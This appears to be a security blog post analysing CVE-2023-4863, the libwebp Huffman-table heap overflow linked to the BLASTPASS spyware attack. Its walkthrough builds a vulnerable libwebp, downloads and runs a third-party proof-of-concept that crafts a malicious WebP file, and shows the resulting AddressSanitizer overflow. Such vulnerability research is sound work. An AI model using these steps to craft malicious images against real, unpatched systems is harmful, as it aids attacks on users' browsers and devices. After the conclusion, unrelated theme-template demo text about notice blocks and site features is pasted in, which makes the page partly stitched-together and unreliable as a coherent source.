---
title: "CVE-2023-4863: The WebP 0day"
categories:
  - Blog
tags:
  - CVEs
---
Last month, a new zero-day vulnerability was uncovered when Google released a critical update for its Chrome browser. A warning that accompanied the CVE announcement said "Google is aware that an exploit for CVE-2023-4863 exists in the wild": an active threat actor has already exploited this vulnerability. 

**CVE-2023-4863:** Heap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page.
{: .notice--info}

####Discovery Timeline
The discovery of CVE-2023-4863 is intricately linked to an earlier Apple CVE, CVE-2023-41064. It all began when Citizen Lab detected suspicious activity on an iPhone belonging to an employee of a Washington DC-based civil society organization. Dubbed "BLASTPASS," this activity was attributed to an NSO Group's Pegasus spyware exploit, specifically a zero-click exploit for iMessage.

Apple swiftly responded by releasing a security bulletin, featuring two new CVEs, CVE-2023-41061 and CVE-2023-41064. On these CVEs, Apple noted, "Apple is aware of a report that this issue may have been actively exploited."

The BLASTPASS attack bypassed the iMessage sandbox, likely by embedding a malicious image in a PassKit attachment. This attack corresponds to the first CVE released by Apple, CVE-2023-41061. The second CVE, CVE-2023-41064, identified a buffer overflow vulnerability in ImageIO, Apple's image parsing framework.

However, the key insight comes from the fact that ImageIO recently started supporting WebP files. Shortly before Apple's security bulletin, Apple's team reported a WebP vulnerability to Chrome, which was rapidly patched. Google marked this fix as "exploited in the wild." It appears that the BLASTPASS vulnerability and CVE-2023-4863 (the WebP 0day) are one and the same.

####The WebP 0day - Technical Analysis
The technical analysis of CVE-2023-4863 sheds light on the inner workings of this zero-day vulnerability. By cross-referencing Chrome's bug ID with open source commits in the libwebp library code, an essential patch was identified: "Fix OOB write in BuildHuffmanTable." This patch was created one day after Apple's report and corresponds to CVE-2023-4863.

This vulnerability is associated with the "lossless compression" support for WebP, using Huffman coding. This coding is a critical component of lossless image compression, where an algorithm assigns shorter or longer sequences of output bits based on the frequency of input values. The vulnerability resided in the handling of the Huffman tables when decoding an untrusted image, leading to an out-of-bounds write.
 
To exploit this issue, an attacker would need to manipulate code lengths, allowing them to exceed the pre-calculated buffer size. The complexity of the Huffman tree and the interaction between various factors make crafting a triggering file non-trivial.

####Technical Walkthrough
I simply wanted to walkthrough the POC process, so I leveraged the research of @mistymntcop and @isosceles. They worked together to reproduce the issue and create a buffer overflow. 

I replicated the bug with the following code:
```html
 # checkout webp
$ git clone https://chromium.googlesource.com/webm/libwebp/ webp_test
$ cd webp_test/
  # checkout vulnerable version
$ git checkout 7ba44f80f3b94fc0138db159afea770ef06532a0
  # enable AddressSanitizer
$ sed -i 's/^EXTRA_FLAGS=.*/& -fsanitize=address/' makefile.unix
  # build webp
$ make -f makefile.unix
$ cd examples/
  # fetch mistymntncop's proof-of-concept code
$ wget https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/craft.c
  # build and run proof-of-concept
$ gcc -o craft craft.c
$ ./craft bad.webp
  # test trigger file
$ ./dwebp bad.webp -o test.png
```
Which generated the following output:
```html
  SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/kali/webp_test/examples/dwebp+0x9eaec) (BuildId: 4c1cbf5ffb5b244be01b298cd51c59ec4d429d35) in BuildHuffmanTable
Shadow bytes around the buggy address:
  0x626000002c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x626000002d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x626000002d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x626000002e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x626000002e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x626000002f00: 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa
  0x626000002f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x626000003000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x626000003080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x626000003100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x626000003180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==22919==ABORTING
```
Despite having limited control over the written value, this POC proves that this version of webp is exploitable via buffer overflow.

####Final Thoughts
The discovery of the WebP 0day, CVE-2023-4863, sheds light on the challenges and complexities of zero-day vulnerabilities in widely used open source libraries. This issue underscores the need for a more comprehensive approach to cybersecurity, combining fuzzing, code audits, and manual analysis.






Want to wrap several paragraphs or other elements in a notice? Using Liquid to capture the content and then filter it with `markdownify` is a good way to go.

```html
{% raw %}{% capture notice-2 %}
#### New Site Features

* You can now have cover images on blog pages
* Drafts will now auto-save while writing
{% endcapture %}{% endraw %}

<div class="notice">{% raw %}{{ notice-2 | markdownify }}{% endraw %}</div>
```

{% capture notice-2 %}
#### New Site Features

* You can now have cover images on blog pages
* Drafts will now auto-save while writing
{% endcapture %}

<div class="notice">
  {{ notice-2 | markdownify }}
</div>

Or you could skip the capture and stick with straight HTML.

```html
<div class="notice">
  <h4>Message</h4>
  <p>A basic message.</p>
</div>
```

<div class="notice">
  <h4>Message</h4>
  <p>A basic message.</p>
</div>
